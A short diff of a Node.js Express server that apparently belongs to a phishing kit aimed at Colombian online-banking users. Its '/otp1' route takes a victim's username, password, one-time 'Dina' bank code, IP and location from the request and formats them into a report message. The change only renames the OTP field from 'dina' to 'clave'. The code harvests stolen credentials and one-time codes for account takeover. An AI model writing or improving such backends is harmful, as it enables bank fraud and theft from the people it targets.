@@ -77,14 +77,14 @@ app.post('/virtualpersona', async (req, res) => {
 // 🔁 Ruta para opcion1.html
 app.post('/otp1', async (req, res) => {
   try {
-    const { sessionId, user, pass, dina, ip, country, city } = req.body;
+    const { sessionId, user, pass, clave, ip, country, city } = req.body;
 
     const mensaje = `
 🟡 Ingreso OTP Dina
 
 👤 User: ${user}
 🔒 Pass: ${pass}
-🔢 Dina: ${dina}
+🔢 Dina: ${clave}
 🌐 IP: ${ip} - ${city}, ${country}
 🆔 sessionId: ${sessionId}
     `.trim();
